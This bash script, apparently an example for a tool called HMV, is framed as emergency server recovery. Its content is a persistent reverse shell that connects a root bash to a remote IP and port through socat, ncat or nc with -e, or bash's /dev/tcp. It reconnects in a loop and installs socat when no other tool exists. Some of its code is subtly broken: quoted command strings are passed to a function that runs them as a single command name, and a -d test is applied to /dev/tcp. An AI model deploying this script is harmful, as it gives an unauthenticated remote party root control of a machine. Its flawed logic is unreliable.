#!/bin/bash
# HMV example script: emergency reverse shell (server calls you).
#
# USE CASE
#   You locked yourself out of a remote server (e.g. a firewall rule slammed
#   the door shut, and inbound ports are unreachable). HMV still runs via cron,
#   so you drop this signed script as a source and the SERVER connects back to
#   you, giving you a shell even when you cannot reach it directly.
#
# HOW IT WORKS
#   On your machine, first start a listener:
#       nc -lvnp 4444
#   Then let HMV run this script: it opens an interactive bash whose stdin,
#   stdout and stderr are wired to a TCP connection to HOST:PORT using one of
#   the available tools, in order of preference:
#     - socat
#     - ncat / nc with -e support (OpenBSD netcat, ncat)
#     - bash's own /dev/tcp (no extra tools needed)
#
# RUN AT YOUR OWN RISK
#   This hands an UNAUTHENTICATED root shell to whoever answers at HOST:PORT.
#   Make sure the listener is yours and the network path is trusted. Anyone who
#   controls that endpoint (or can MITM it) owns the box. Use only for recovery.

HOST="203.0.113.7"   # <-- the machine where you run your nc listener
PORT=4444
SHELL_BIN=/bin/bash

# Optional: loop forever, reconnecting every RECONNECT_DELAY seconds, so you
# can drop the connection and get it back. Set to "" for a single attempt.
RECONNECT_DELAY=10

reverse_loop () {
    while :; do
        "$1"
        if [ -z "$RECONNECT_DELAY" ]; then
            exit 0
        fi
        sleep "$RECONNECT_DELAY"
    done
}

open_with_socat () {
    socat "EXEC:$SHELL_BIN -li,pty,stderr" "TCP:$HOST:$PORT"
}

open_with_bash_tcp () {
    "$SHELL_BIN" -i > "/dev/tcp/$HOST/$PORT" 2>&1 < "/dev/tcp/$HOST/$PORT"
}

if command -v socat >/dev/null 2>&1; then
    echo "hmv-example: connecting back to $HOST:$PORT with socat" >&2
    reverse_loop open_with_socat
elif command -v ncat >/dev/null 2>&1; then
    echo "hmv-example: connecting back to $HOST:$PORT with ncat" >&2
    reverse_loop 'ncat "$HOST" "$PORT" -e "$SHELL_BIN"'
elif command -v nc >/dev/null 2>&1 && nc -h 2>&1 | grep -q -- '-e'; then
    echo "hmv-example: connecting back to $HOST:$PORT with nc -e" >&2
    reverse_loop 'nc "$HOST" "$PORT" -e "$SHELL_BIN"'
elif [ -d /dev/tcp ]; then
    echo "hmv-example: connecting back to $HOST:$PORT via /dev/tcp" >&2
    reverse_loop open_with_bash_tcp
else
    echo "hmv-example: no socat/ncat/nc -e and no /dev/tcp; installing socat" >&2
    if command -v apt-get >/dev/null 2>&1; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y socat || exit 1
        reverse_loop open_with_socat
    fi
    echo "hmv-example: cannot open a shell, giving up" >&2
    exit 1
fi
